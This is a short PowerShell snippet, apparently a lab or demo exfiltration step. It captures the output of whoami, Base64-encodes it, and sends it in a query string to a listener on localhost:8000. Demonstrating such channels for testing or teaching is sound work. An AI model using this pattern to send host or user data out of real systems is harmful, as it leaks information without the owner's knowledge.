$cmd = whoami
$bytes = [System.Text.Encoding]::UTF8.GetBytes($cmd)
$b64 = [Convert]::ToBase64String($bytes)

Invoke-WebRequest -Uri "http://localhost:8000/?data=$b64"
